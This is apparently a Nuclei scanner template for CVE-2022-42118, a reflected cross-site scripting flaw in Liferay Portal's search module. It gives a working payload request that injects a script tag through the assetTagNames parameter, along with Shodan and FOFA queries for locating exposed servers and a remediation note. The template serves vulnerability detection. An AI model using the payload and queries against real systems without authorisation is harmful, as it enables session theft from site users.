http:
- matchers:
  - part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
  - condition: and
    part: header
    type: word
    words:
    - text/html
    - Liferay Portal
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/web/guest/home?p_p_id=com_liferay_portal_search_web_portlet_SearchPortlet&p_p_lifecycle=0&_com_liferay_portal_search_web_portlet_SearchPortlet_keywords=test&_com_liferay_portal_search_web_portlet_SearchPortlet_scope=this-site&_com_liferay_portal_search_web_portlet_SearchPortlet_assetTagNames=<script>alert(document.domain)</script>'
id: CVE-2022-42118
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:liferay:liferay_portal:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-42118
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.92276
    epss-score: 0.0889
  description: 'A Cross-site scripting (XSS) vulnerability in the Portal Search module
    in Liferay Portal 7.1.0 through 7.4.2, and Liferay DXP 7.1 before fix pack 27,
    7.2 before fix pack 15, and 7.3 before service pack 3 allows remote attackers
    to inject arbitrary web script or HTML via the `tag` parameter.

    '
  impact: 'Unauthenticated attackers can inject malicious JavaScript through the tag
    parameter in the Portal Search module to steal Liferay Portal user session cookies
    and credentials.

    '
  metadata:
    fofa-query: body="var Liferay"
    product: liferay_portal
    shodan-query: html:"var Liferay"
    vendor: liferay
  name: Liferay Portal - Cross-site Scripting
  reference:
  - https://issues.liferay.com/browse/LPE-17342
  - https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/cve-2022-42118
  - https://nvd.nist.gov/vuln/detail/CVE-2022-42118
  remediation: 'Update to Liferay Portal 7.4.3+, DXP 7.1 fix pack 27+, DXP 7.2 fix
    pack 15+, or DXP 7.3 service pack 3+.

    '
  severity: medium
  tags: cve,cve2022,liferay,xss,vuln
